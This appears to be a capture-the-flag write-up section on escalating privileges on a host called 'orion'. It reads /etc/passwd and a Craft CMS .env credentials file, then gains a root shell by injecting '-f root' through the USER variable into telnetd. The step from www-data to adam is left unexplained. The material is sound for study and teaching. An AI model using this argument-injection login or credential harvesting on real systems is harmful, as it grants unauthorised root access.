## Privilege Escalation

### www-data → adam

We read `/etc/passwd` to identify the users present on the system:

```
www-data@orion:~/html/craft/web$ cat /etc/passwd | grep home
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
adam:x:1000:1000::/home/adam:/bin/bash
```

The only interesting user is `adam`. Looking at the Craft CMS configuration, we find the `.env` file containing the database credentials:

```
www-data@orion:~/html/craft$ cat .env
```


We check the installed telnet client version:

```
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
```

Version **2.7** of GNU inetutils telnet is affected by a recent CVE, **CVE-2026-24061**, which allows an attacker to tamper with the `USER` environment variable sent by the client to the `telnetd` daemon, making it possible to authenticate as an arbitrary system user (including `root`) without providing a password.

We exploit the vulnerability:

```
adam@orion:~$ USER="-f root" telnet -a localhost 23
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/1)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)
```
